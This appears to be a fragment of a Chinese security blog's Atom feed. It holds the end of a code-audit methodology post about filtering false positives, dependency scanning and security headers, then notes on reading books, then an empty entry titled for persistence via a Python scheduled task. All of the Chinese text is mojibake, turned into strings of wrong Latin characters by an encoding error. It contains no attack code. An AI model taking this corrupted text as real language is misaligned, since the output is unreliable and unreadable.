&lt;p>ï¼ˆ4ï¼‰è€ƒè™‘è®¾è®¡è¿‡ç¨‹ä¸­åšçš„æ¯ä¸€ä¸ªå‡è®¾ï¼Œå¹¶æƒ³è±¡å‡è®¾è¢«è¿èƒŒçš„æ¯ç§æƒ…å†µï¼Œå°¤å…¶æ³¨æ„ç”¨æˆ·å¯ä»¥å®Œå…¨æ§åˆ¶çš„å‡è®¾æ¡ä»¶ã€‚&lt;/p>
&lt;p>3ã€å¦‚ä½•æé«˜å‡†å¬ç‡&lt;/p>
&lt;p>ä¸»è¦å…³äºå¦‚ä½•æé«˜å‡†ç¡®æ€§å’Œå®Œæ•´æ€§çš„é—®é¢˜ã€‚&lt;/p>
&lt;p>ï¼ˆ1ï¼‰ç°ä»£ç¼–ç¨‹ä¸­å…³æ³¨ä»£ç è°ƒåº¦ã€è„šæ‰‹æ¶ã€ç»Ÿä¸€æ¡†æ¶ã€é«˜åº¦å°è£…çš„é—®é¢˜ï¼šè¿‡æ»¤å’Œé¢„ç¼–è¯‘ç­‰å®‰å…¨é˜²æŠ¤éƒ½åœ¨æ¡†æ¶å±‚æˆ–è€…å…¬å…±class/functionå®Œæˆçš„å¯å¿½ç•¥ï¼›&lt;/p>
&lt;p>ï¼ˆ2ï¼‰ä¼ å…¥å±é™©å‡½æ•°çš„å‚æ•°ç”¨æˆ·ä¸å¯æ§çš„å¯å¿½ç•¥ï¼›&lt;/p>
&lt;p>ï¼ˆ3ï¼‰ä¾èµ–ç»„ä»¶æ‰«æåªæ˜¯æä¾›ä¸€ç§æ€è·¯æˆ–è€…ç¼©å°å®¡è®¡èŒƒå›´ï¼Œå·¥å…·æ‰«å‡ºåéœ€è¦å¤æ ¸ï¼Œå¦‚ä½•å­˜åœ¨é—®é¢˜çš„å‡½æ•°æˆ–è€…ç±»ä¸šåŠ¡å¹¶æ²¡æœ‰ä½¿ç”¨ï¼Œä¸ä½œä¸ºæ¼æ´ï¼Œåªä½œé£é™©æé†’ï¼›&lt;/p>
&lt;p>ï¼ˆ4ï¼‰æ¥å…¥å±‚å·²ä½¿ç”¨httpsçš„ï¼Œä¸éœ€è¦å…³æ³¨HSTSç­‰å®‰å…¨headerå¼‚å¸¸ï¼Œä½†ä»å»ºè®®ç¨‹åºè‡ªè¡Œé…ç½®å®‰å…¨headerï¼Œç‰¹åˆ«æ˜¯secure/httponly/X-Content-Type-Options:nosniffç­‰ä¸é€‚åˆåœ¨æ¥å…¥å±‚ç»Ÿä¸€é…ç½®çš„ï¼›&lt;/p>
&lt;p>ï¼ˆ5ï¼‰å¯¹äºå¸¸è§çš„åº”ç”¨åœºæ™¯ï¼Œå¦‚æ–‡ä»¶æ“ä½œã€å‘½ä»¤è¡Œæ“ä½œã€æ•°æ®åº“æ“ä½œã€ç”¨æˆ·æƒé™åŠè®¤è¯ç­‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£æ¡†æ¶çš„å®ç°ï¼Œç»™å‡ºç›¸åº”çš„å®‰å…¨ç¼–ç èŒƒä¾‹ã€‚æ¡†æ¶æ–‡æ¡£ä¸­ç»™å‡ºçš„ä¾‹å­å¹¶ä¸ä¸€å®šå°±æ˜¯æœ€å¥½çš„ã€‚å®‰å…¨ä¾§å¿…é¡»å¯¹å¼€å‘è¿›è¡Œå®‰å…¨æ„è¯†çš„åŸ¹è®­ï¼Œè®©ä»–çŸ¥é“å¦‚ä½•åˆ©ç”¨æ¡†æ¶çš„APIå»å®‰å…¨çš„ç»„åˆå‡ºå¸¸ç”¨åŠŸèƒ½ã€‚&lt;/p>
&lt;p>å¯¹äºåº”ç”¨æ¼æ´æŒ–æ˜ï¼Œæˆ‘ä»¬éœ€è¦æ‰©å……å­—å…¸ã€‚æ¡†æ¶çš„å°è£…ï¼Œå¯èƒ½å¼•å…¥æ›´å¤šçš„å±é™©APIæˆ–å±é™©ç‰¹æ€§ã€‚åœ¨ä»£ç å®¡è®¡çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å°†è¿™äº›å†…å®¹åŠ å…¥åˆ°å±é™©è¯å­—å…¸ä¸­ã€‚&lt;/p></content><category scheme="https://if1sh.com/categories/code-audit/" term="Code Audit" label="Code Audit"/><category scheme="https://if1sh.com/tags/%E6%96%B9%E6%B3%95%E8%AE%BA/" term="æ–¹æ³•è®º" label="æ–¹æ³•è®º"/></entry><entry><title type="text">é˜…è¯»ä¸€æœ¬ä¹¦</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/"/><id>https://if1sh.com/posts/%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2021-02-16T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">å¦‚ä½•é˜…è¯»ä¸€æœ¬ä¹¦ é˜…è¯»åˆ†ä¸ºå››ä¸ªå±‚æ¬¡ï¼šåŸºç¡€é˜…è¯»ã€æ£€è§†é˜…è¯»ã€åˆ†æé˜…è¯»ã€ä¸»é¢˜é˜…è¯» åŸºç¡€é˜…è¯» æœ€åŸºæœ¬â€¦â€¦</summary><content type="html">&lt;h1 id="å¦‚ä½•é˜…è¯»ä¸€æœ¬ä¹¦">å¦‚ä½•é˜…è¯»ä¸€æœ¬ä¹¦&lt;/h1>
&lt;p>é˜…è¯»åˆ†ä¸ºå››ä¸ªå±‚æ¬¡ï¼šåŸºç¡€é˜…è¯»ã€æ£€è§†é˜…è¯»ã€åˆ†æé˜…è¯»ã€ä¸»é¢˜é˜…è¯»&lt;/p>
&lt;h2 id="åŸºç¡€é˜…è¯»">åŸºç¡€é˜…è¯»&lt;/h2>
&lt;p>æœ€åŸºæœ¬çš„å¬è¯´è¯»å†™èƒ½åŠ›&lt;/p>
&lt;h2 id="æ£€è§†é˜…è¯»">æ£€è§†é˜…è¯»&lt;/h2>
&lt;h3 id="æ£€è§†é˜…è¯»çš„æ–¹å¼">æ£€è§†é˜…è¯»çš„æ–¹å¼&lt;/h3>
&lt;ol>
&lt;li>é€šè¿‡å‰è¨€ã€ç›®å½•ã€ç´¢å¼•ï¼ˆå¯èƒ½å…³ç³»åˆ°ä½œè€…çš„ä»·å€¼å–å‘ï¼‰ã€å‡ºç‰ˆä»‹ç»è¿™å››ä¸ªæ–¹å‘æ¥å¿«é€Ÿé˜…è¯»&lt;/li>
&lt;li>å¿«é€Ÿçš„é˜…è¯»ï¼Œçœ‹ä¸æ‡‚çš„å°±è¿‡ï¼Œä¸è¦çº ç»“ï¼Œç­‰åˆ°è¯»ç¬¬äºŒéçš„æ—¶å€™åœ¨å›é¡¾éš¾ç‚¹ï¼ˆè¿™æ˜¯æ£€è§†é˜…è¯»æœ€æœ€é‡è¦çš„è§„åˆ™ï¼Ÿï¼‰&lt;/li>
&lt;/ol>
&lt;h3 id="æ£€è§†é˜…è¯»çš„é€Ÿåº¦">æ£€è§†é˜…è¯»çš„é€Ÿåº¦&lt;/h3>
&lt;p>è¦çŸ¥é“ä»€ä¹ˆæ—¶å€™ç”¨ä»€ä¹ˆæ ·çš„é€Ÿåº¦æ˜¯æ°å½“çš„&lt;/p>
&lt;h3 id="é€—ç•™ä¸å€’é€€">é€—ç•™ä¸å€’é€€&lt;/h3>
&lt;p>&lt;strong>çœ¼ç›åœ¨é˜…è¯»çš„æ—¶å€™ç§»åŠ¨ï¼Œæ˜¯ä¼šé€ æˆè·³å­—çœ‹çš„æƒ…å†µï¼Œçœ‹ç€çœ‹ç€åˆä¼šå€’é€€åˆ°åŸç‚¹&lt;/strong>&lt;/p>
&lt;p>ç¥å¥‡çš„å¤§è„‘ä¼šæ ¹æ®è¿™äº›å¥å­æ¥ç”Ÿæˆä¿¡æ¯ï¼Œä¾‹å¦‚ä¸‹é¢ï¼š
å³ä¾¿æ˜¯æˆè¯­ï¼Œä¹Ÿéƒ½æ˜¯å››ä¸ªå­—çš„ï¼Œæ‰€ä»¥éšæ„é¢ å€’é¡ºåºï¼Œéƒ½èƒ½çœ‹å¾—æ‡‚ã€‚
ä½ ç°åœ¨çœ‹çš„åˆ°å¥è¿™è¯å°±æ˜¯é¢ é¡ºå€’åºçš„ã€‚&lt;/p>
&lt;p>å¦‚ä½•çŸ«æ­£é˜…è¯»é€Ÿåº¦ï¼Ÿ
æ‹¿ç€ç¬”é¡ºç€å­—ä¸€è¡Œä¸€è¡Œçš„ç§»åŠ¨ä¸‹å»ï¼Œä¸€æ—¦ä½ çš„çœ¼ç›èƒ½è·Ÿç€æ‰‹ç§»åŠ¨æ—¶ï¼Œä½ å°±èƒ½è¯»åˆ°é‚£äº›å¥å­äº†&lt;/p>
&lt;h2 id="ä¸»åŠ¨é˜…è¯»">ä¸»åŠ¨é˜…è¯»&lt;/h2>
&lt;p>åœ¨é˜…è¯»è¿‡ç¨‹æå‡ºé—®é¢˜ï¼Œå¹¶ä¸”å°è¯•è§£å†³é—®é¢˜&lt;/p>
&lt;h3 id="æå‡ºé—®é¢˜">æå‡ºé—®é¢˜&lt;/h3>
&lt;ol>
&lt;li>è¿™æœ¬ä¹¦åˆ°åº•åœ¨è°ˆä»€ä¹ˆï¼Ÿä¸€å®šè¦æƒ³åŠæ³•æ‰¾åˆ°ä¹¦çš„ä¸»é¢˜ï¼Œä½œè€…å¦‚ä½•ä¾æ¬¡å‘å±•è¿™ä¸ªä¸»é¢˜ï¼Œå¦‚ä½•ä»ä¸»é¢˜åˆ†è§£å‡ºä»å±çš„å…³é”®è®®é¢˜&lt;/li>
&lt;li>ä½œè€…ç»†èŠ‚è¯´äº†ä»€ä¹ˆï¼Ÿæ€ä¹ˆè¯´çš„ï¼Ÿä¸€å®šè¦æƒ³åŠæ³•æ‰¾åˆ°ä½œè€…çš„æƒ³æ³•ã€è®ºç‚¹&lt;/li>
&lt;li>è¿™æœ¬ä¹¦è¯´çš„æœ‰é“ç†å—ï¼Ÿ&lt;/li>
&lt;li>è¿™æœ¬ä¹¦è·Ÿæˆ‘æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ&lt;/li>
&lt;/ol>
&lt;h3 id="å›ç­”é—®é¢˜">å›ç­”é—®é¢˜&lt;/h3>
&lt;p>åœ¨ä¹¦ä¸Šåšç¬”è®°ï¼Œå…¶å®å°±æ˜¯åœ¨è¡¨è¾¾ä½ è·Ÿä½œè€…ä¹‹é—´ç›¸ä¾æˆ–è€…ç›¸åŒçš„è§‚ç‚¹&lt;/p>
&lt;p>åšç¬”è®°çš„æ ‡è¯†ï¼š&lt;/p>
&lt;ol>
&lt;li>ç”»åº•çº¿ï¼Œè¡¨ç¤ºé‡è¦&lt;/li>
&lt;li>ç”»åŒé‡åº•çº¿ï¼Œè¡¨ç¤ºæ›´åŠ é‡è¦&lt;/li>
&lt;li>ä½¿ç”¨æ˜Ÿå·ï¼Œæ ‡è®°ä¸€ä¸ªé‡è¦å¤§æ®µè½&lt;/li>
&lt;li>ä½¿ç”¨é—®å·ï¼Œè¡¨ç¤ºç–‘é—®&lt;/li>
&lt;li>ä½¿ç”¨ç¼–å·ï¼Œæ ‡è®°ä½œè€…çš„è®ºè¿°&lt;/li>
&lt;/ol>
&lt;h2 id="åˆ†æé˜…è¯»">åˆ†æé˜…è¯»&lt;/h2>
&lt;ol>
&lt;li>åˆ†æé˜…è¯»é¦–å…ˆå°±æ˜¯è¦çŸ¥é“ä½ åœ¨è¯»ä»€ä¹ˆä¹¦ï¼Œå…ˆç»™ä¹¦åˆ†ç±»ä¸€ä¸‹ï¼Œåˆ†å‡ºå·¥å…·ä¹¦å’Œç†è®ºä¹¦&lt;/li>
&lt;li>ä½¿ç”¨ç®€å•çš„è¯æ¥å™è¿°æ•´æœ¬ä¹¦çš„å†…å®¹&lt;/li>
&lt;li>æŠŠä¹¦é‡è¦çš„ç¯‡ç« åˆ—å‡ºæ¥ï¼Œæ˜¯æŒ‰ç…§ä»€ä¹ˆé¡ºåºç»„æˆçš„æ•´ä½“æ¶æ„&lt;/li>
&lt;li>çŸ¥é“ä½œè€…çš„é—®é¢˜ï¼Œä¸€æœ¬ä¹¦å¯èƒ½æœ‰ä¸€ä¸ªç­”æ¡ˆï¼Œå¯èƒ½æœ‰å¤šä¸ªç­”æ¡ˆï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰ç­”æ¡ˆ&lt;/li>
&lt;/ol></content><category scheme="https://if1sh.com/categories/%E9%9A%8F%E6%83%B3/" term="éšæƒ³" label="éšæƒ³"/><category scheme="https://if1sh.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" term="è¯»ä¹¦ç¬”è®°" label="è¯»ä¹¦ç¬”è®°"/></entry><entry><title type="text"/><link rel="alternate" type="text/html" href="https://if1sh.com/posts/vx_recycle_bin/20220314/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1.md/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/><id>https://if1sh.com/posts/vx_recycle_bin/20220314/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1.md/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</id><updated>2023-01-01T18:53:09+08:00</updated><published>0001-01-01T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">æƒé™ç»´æŒ-pyè®¡åˆ’ä»»åŠ¡</summary><content type="html">&lt;h1 id="æƒé™ç»´æŒ-pyè®¡åˆ’ä»»åŠ¡">æƒé™ç»´æŒ-pyè®¡åˆ’ä»»åŠ¡&lt;/h1></content></entry></feed>